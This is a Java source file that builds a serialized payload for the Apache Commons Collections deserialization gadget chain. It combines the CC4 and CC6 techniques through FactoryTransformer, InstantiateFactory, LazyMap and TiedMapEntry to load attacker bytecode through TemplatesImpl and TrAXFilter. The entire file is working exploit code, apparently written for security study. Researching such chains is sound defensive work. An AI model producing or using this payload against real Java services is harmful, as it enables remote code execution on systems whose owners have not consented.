import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 *  主要思想是用FactoryTransformer替代chaintransformer
 *  这里使用CC4+CC6

 */
public class CommonsCollections6Y4 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public byte[] getPayload() throws Exception {


        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evily4.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        InstantiateFactory instantiateFactory = new InstantiateFactory(String.class);
        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, factoryTransformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "y4");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("y4");

        setFieldValue(instantiateFactory,"iClassToInstantiate",TrAXFilter.class);
        setFieldValue(instantiateFactory,"iParamTypes",new Class[]{Templates.class});
        setFieldValue(instantiateFactory,"iArgs",new Object[]{obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();


        return barr.toByteArray();
    }

    public static void main(String[] args) throws Exception{
        
    }
}
